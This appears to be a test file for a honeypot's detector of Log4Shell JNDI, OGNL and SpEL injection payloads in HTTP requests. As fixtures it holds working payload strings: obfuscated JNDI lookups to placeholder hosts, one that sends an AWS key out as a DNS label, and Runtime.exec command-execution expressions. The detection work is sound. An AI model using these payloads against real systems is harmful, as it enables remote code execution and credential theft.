"""Tests for the interpolation-payload observer.

The observer matches on request *shape* rather than on a served path.
That is the whole reason it exists: a client that puts its payload in a
header and asks for `/` defeats every path-matched trap by construction,
and before this it was indistinguishable from any other 404.

Five properties are worth defending:

1. **The observer never changes a response.** Load-bearing, and the same
   property the canary-echo observer defends. A server that answered a
   JNDI payload even slightly differently could be tested for
   honeypot-ness by sending it one and diffing the reply.
2. **Obfuscated and plain spellings produce the same finding.** Payloads
   spelled `${${::-j}${::-n}${::-d}${::-i}:...}` exist precisely so a
   literal-substring matcher misses them.
3. **The callback host and the requested variable names are separable.**
   They answer different questions — whose infrastructure, and what are
   they collecting — so a nested `${env:...}` must not be filed as a
   hostname.
4. **Every header is scanned, not the logged subset.** The payload lands
   in `User-Agent` far more often than anywhere else, and `User-Agent`
   is not a header whose value is written to the log.
5. **Nothing a sender controls is unbounded.** Count, length and
   de-obfuscation passes all have ceilings.
"""

import json

import pytest
import pytest_asyncio

from flux import server as tbenv

from .test_server import _fake_issue_credentials  # noqa: F401


# The canonical Log4Shell probe, and the two spellings sweeps use to
# keep the literal `jndi` off the wire.
PLAIN = "${jndi:ldap://scanner.example/a}"
MARKER_OBFUSCATED = "${${::-j}${::-n}${::-d}${::-i}:ldap://scanner.example/a}"
CASE_OBFUSCATED = "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://scanner.example/a}"
# Interpolation nested inside the callback host: the variable's value
# leaves as a DNS label, so the lookup itself is the exfiltration.
EXFIL = "${jndi:ldap://${env:AWS_ACCESS_KEY_ID}.collect.example/x}"


@pytest.fixture(autouse=True)
def enabled(monkeypatch):
    monkeypatch.setattr(tbenv, "INTERPOLATION_PROBE_ENABLED", True)


@pytest_asyncio.fixture
async def flux_client(aiohttp_client, monkeypatch, tmp_path):
    monkeypatch.setattr(tbenv, "LOG_PATH", tmp_path / "env-canary.jsonl")
    monkeypatch.setattr(tbenv, "INTERPOLATION_PROBE_ENABLED", True)
    # Same reason as the shared fixture in test_server.py: without this
    # the canary-bearing traps reached here go to the live Tracebit API,
    # so the module passed or failed on an ambient env var rather than on
    # the code under test.
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "issue_credentials", _fake_issue_credentials)
    client = await aiohttp_client(tbenv.create_app())
    client.log_path = tmp_path / "env-canary.jsonl"
    return client


def _last(log_path):
    return [json.loads(l) for l in log_path.read_text().splitlines()][-1]


def scan(target="/", headers=None, body=b""):
    return tbenv.interpolation_probe_scan(target, headers or {}, body)


# --- Recognition ----------------------------------------------------------


def test_plain_jndi_is_recognised():
    out = scan(headers={"User-Agent": PLAIN})
    assert "jndi" in out["interpolationFamilies"]
    assert out["interpolationIn"] == ["header:user-agent"]


def test_callback_host_is_extracted():
    out = scan(headers={"User-Agent": PLAIN})
    assert out["interpolationCallbacks"] == ["ldap://scanner.example"]


@pytest.mark.parametrize("payload", [MARKER_OBFUSCATED, CASE_OBFUSCATED])
def test_obfuscated_spellings_match_the_plain_one(payload):
    """The point of these spellings is that `jndi` never appears in the
    bytes. A matcher that only sees the literal misses the entire
    WAF-evasion population."""
    assert "jndi" not in payload.lower().replace("${lower:", "")
    out = scan(headers={"User-Agent": payload})
    assert "jndi" in out["interpolationFamilies"]
    assert "obfuscated" in out["interpolationFamilies"]
    assert out["interpolationCallbacks"] == ["ldap://scanner.example"]


def test_plain_payload_is_not_flagged_obfuscated():
    out = scan(headers={"User-Agent": PLAIN})
    assert "obfuscated" not in out["interpolationFamilies"]


def test_env_lookup_is_reported_as_a_credential_request():
    """`${env:NAME}` resolves before the lookup fires, so the name is a
    statement of what the sender is collecting."""
    out = scan(headers={"User-Agent": EXFIL})
    assert "credential-lookup" in out["interpolationFamilies"]
    assert "env:AWS_ACCESS_KEY_ID" in out["interpolationLookupKeys"]


def test_nested_lookup_is_not_filed_as_a_callback_host():
    """Property 3: `${env:...}` inside the host position is an
    exfiltration channel, not infrastructure. Filing it as a hostname
    would put a variable name in the field used to attribute a sender."""
    out = scan(headers={"User-Agent": EXFIL})
    for host in out.get("interpolationCallbacks", []):
        assert "$" not in host
        assert "AWS_ACCESS_KEY_ID" not in host


@pytest.mark.parametrize("scheme", ["ldap", "ldaps", "rmi", "dns", "iiop", "corba"])
def test_every_jndi_scheme_is_recognised(scheme):
    out = scan(headers={"User-Agent": "${jndi:%s://h.example/a}" % scheme})
    assert "jndi" in out["interpolationFamilies"]
    assert out["interpolationCallbacks"] == ["%s://h.example" % scheme]


def test_ognl_payload_is_recognised():
    out = scan(target="/x?q=%{(#_memberAccess=@ognl.OgnlContext@DEFAULT)}")
    assert "ognl" in out["interpolationFamilies"]


def test_spel_payload_is_recognised():
    out = scan(headers={"X-Api-Version": "${T(java.lang.Runtime).getRuntime()}"})
    assert "spel" in out["interpolationFamilies"]


def test_bare_expression_is_lowest_confidence_family():
    out = scan(headers={"User-Agent": "${placeholder}"})
    assert out["interpolationFamilies"] == ["bare-expression"]


# --- Where it looks -------------------------------------------------------


def test_target_is_scanned():
    out = scan(target="/?x=" + PLAIN)
    assert out["interpolationIn"] == ["target"]


def test_percent_encoded_target_is_decoded_first():
    out = scan(target="/?x=%24%7Bjndi%3Aldap%3A%2F%2Fenc.example%2Fa%7D")
    assert "jndi" in out["interpolationFamilies"]
    assert out["interpolationCallbacks"] == ["ldap://enc.example"]


def test_body_is_scanned():
    out = scan(body=PLAIN.encode())
    assert out["interpolationIn"] == ["body"]


def test_every_header_is_scanned_not_the_logged_subset():
    """Property 4. `User-Agent` and `Authorization` are absent from
    `LOG_HEADER_NAMES` — scanning only that list is what made a payload
    in `User-Agent` read as an ordinary 404."""
    assert "User-Agent" not in tbenv.LOG_HEADER_NAMES
    assert "Authorization" not in tbenv.LOG_HEADER_NAMES
    out = scan(headers={"Authorization": "Bearer " + PLAIN})
    assert out["interpolationIn"] == ["header:authorization"]


def test_sweep_across_many_headers_records_each_location():
    out = scan(headers={"User-Agent": PLAIN, "Referer": PLAIN, "X-Api-Version": PLAIN})
    assert out["interpolationIn"] == [
        "header:referer", "header:user-agent", "header:x-api-version",
    ]
    assert out["interpolationCount"] == 3


# --- Quiet on ordinary traffic -------------------------------------------


@pytest.mark.parametrize("value", [
    "", "Mozilla/5.0", "curl/8.4.0", "application/json",
    "text/html; charset=utf-8", "no braces at all", "{}", "{not: interpolation}",
])
def test_ordinary_values_say_nothing(value):
    assert scan(headers={"User-Agent": value}) == {}


def test_plain_request_says_nothing():
    assert scan(target="/wp-login.php") == {}


def test_disabled_says_nothing(monkeypatch):
    monkeypatch.setattr(tbenv, "INTERPOLATION_PROBE_ENABLED", False)
    assert scan(headers={"User-Agent": PLAIN}) == {}


# --- Bounds ---------------------------------------------------------------


def test_reported_lists_are_capped(monkeypatch):
    monkeypatch.setattr(tbenv, "INTERPOLATION_PROBE_MAX_REPORTED", 3)
    headers = {
        "X-H%d" % i: "${jndi:ldap://h%d.example/a}" % i for i in range(20)
    }
    out = scan(headers=headers)
    assert len(out["interpolationCallbacks"]) == 3
    # The cap truncates what is reported, never what is counted.
    assert out["interpolationCallbackCount"] == 20


def test_samples_are_truncated(monkeypatch):
    monkeypatch.setattr(tbenv, "INTERPOLATION_PROBE_SAMPLE_LIMIT", 40)
    out = scan(headers={"User-Agent": "${jndi:ldap://" + "a" * 500 + ".example/a}"})
    assert all(len(s) <= 40 for s in out["interpolationSamples"])


def test_body_scan_is_bounded(monkeypatch):
    monkeypatch.setattr(tbenv, "INTERPOLATION_PROBE_BODY_SCAN_LIMIT", 256)
    assert scan(body=b"x" * 4096 + PLAIN.encode()) == {}


def test_deobfuscation_terminates_on_adversarial_input():
    """The rewrites are what an adversary would use to make us loop, so
    the pass count is bounded rather than run to a fixed point."""
    tbenv._interp_deobfuscate("${::-$}" * 2000)
    tbenv._interp_deobfuscate("${lower:${lower:${lower:j}}}" * 200)


def test_header_scan_surface_is_bounded():
    class Many:
        def items(self):
            return [("X-H%d" % i, "v") for i in range(500)]
    assert len(tbenv.scan_headers(Many())) <= tbenv.SCAN_HEADER_MAX_COUNT


def test_header_values_are_truncated_before_scanning():
    class Long:
        def items(self):
            return [("X-Long", "a" * 100_000)]
    scanned = tbenv.scan_headers(Long())
    assert len(scanned["X-Long"]) == tbenv.SCAN_HEADER_VALUE_LIMIT


# --- The response must not move ------------------------------------------


@pytest.mark.asyncio
async def test_payload_does_not_change_the_response(flux_client):
    """Property 1. Byte-for-byte, header-for-header, status-for-status:
    if any of these moved, a sender could test this server for
    honeypot-ness by sending a payload and diffing the reply."""
    clean = await flux_client.get("/nothing-here", headers={"User-Agent": "curl/8.4.0"})
    clean_body = await clean.read()
    probed = await flux_client.get("/nothing-here", headers={"User-Agent": PLAIN})
    probed_body = await probed.read()

    assert probed.status == clean.status
    assert probed_body == clean_body
    assert dict(probed.headers) == dict(clean.headers)


@pytest.mark.asyncio
async def test_finding_is_stamped_on_the_log_line(flux_client):
    await flux_client.get("/nothing-here", headers={"User-Agent": EXFIL})
    entry = _last(flux_client.log_path)
    assert entry["result"] == "not-handled"
    assert "jndi" in entry["interpolationFamilies"]
    assert "credential-lookup" in entry["interpolationFamilies"]
    assert entry["interpolationCallbacks"] == ["ldap://collect.example"]
    assert "env:AWS_ACCESS_KEY_ID" in entry["interpolationLookupKeys"]


@pytest.mark.asyncio
async def test_finding_rides_on_whichever_trap_answers(flux_client):
    """Stamped before dispatch, so a payload sent to a path some trap
    owns is recorded on that trap's line rather than being lost."""
    await flux_client.get("/.env", headers={"User-Agent": PLAIN})
    entry = _last(flux_client.log_path)
    assert entry["result"] != "not-handled"
    assert "jndi" in entry["interpolationFamilies"]


@pytest.mark.asyncio
async def test_ordinary_request_stamps_nothing(flux_client):
    await flux_client.get("/nothing-here", headers={"User-Agent": "curl/8.4.0"})
    entry = _last(flux_client.log_path)
    assert "interpolationFamilies" not in entry
    assert "interpolationCallbacks" not in entry


# --- Java-reflection payloads, in every brace style they arrive in -------
#
# Shapes below are the public grammars of Struts/OGNL, the Ivanti `format=`
# sink and the `script:javascript:` evaluators. Hosts and identifiers are
# placeholders; nothing here is copied from a live sender.

@pytest.mark.parametrize("payload", [
    # Struts `redirect:`/`action:` — dollar-braced, which is the spelling a
    # `%{`-only pattern used to miss entirely.
    "${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'sh','-c','id'})).start()}",
    "${#context['xwork.MethodAccessor.denyMethodExecution']=false}",
    "${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}",
    "${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id')))}",
    # Reflection by name, the shape that arrives in a `format=` parameter.
    "${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime')}",
    # Script-engine evaluator.
    "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
    # The other two brace styles, which were already covered.
    "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}",
    "#{T(java.lang.Runtime).getRuntime().exec('id')}",
])
def test_java_reflection_payloads_are_ognl_not_bare(payload):
    out = scan(target="/x?q=" + payload)
    assert "ognl" in out["interpolationFamilies"], out["interpolationFamilies"]
    assert "bare-expression" not in out["interpolationFamilies"]


def test_arithmetic_probe_stays_a_bare_expression():
    """`${7*7}` is the canonical does-this-evaluate probe. It carries no
    execution token, so it belongs in the low-confidence bucket rather
    than being promoted alongside the reflection payloads."""
    out = scan(target="/?search=${7*7}")
    assert out["interpolationFamilies"] == ["bare-expression"]


def test_percent_encoded_reflection_payload_is_decoded_then_matched():
    """These arrive encoded in a query value, so the decode pass is what
    makes the token list reachable at all."""
    out = scan(target="/index.action?redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor%22%5D%7D")
    assert "ognl" in out["interpolationFamilies"]


def test_env_lookup_with_a_default_still_names_the_variable():
    """`${env:NAME:-}` supplies a fallback. The variable asked for is the
    same, and bulk env-harvesting payloads use this spelling."""
    out = scan(headers={"User-Agent": "${env:AWS_SECRET_ACCESS_KEY:-}"})
    assert "env:AWS_SECRET_ACCESS_KEY" in out["interpolationLookupKeys"]


def test_filler_lookups_do_not_break_callback_extraction():
    """Numeric `${:-NNN}` fillers pad a callback label for cache-busting.
    They are not obfuscation — the literal is still in the clear — but
    they must not swallow the collector domain."""
    out = scan(headers={
        "User-Agent": "${jndi:ldap://${:-711}${:-665}.probe.collector.example/a}"
    })
    assert "jndi" in out["interpolationFamilies"]
    assert out["interpolationCallbacks"] == ["ldap://probe.collector.example"]
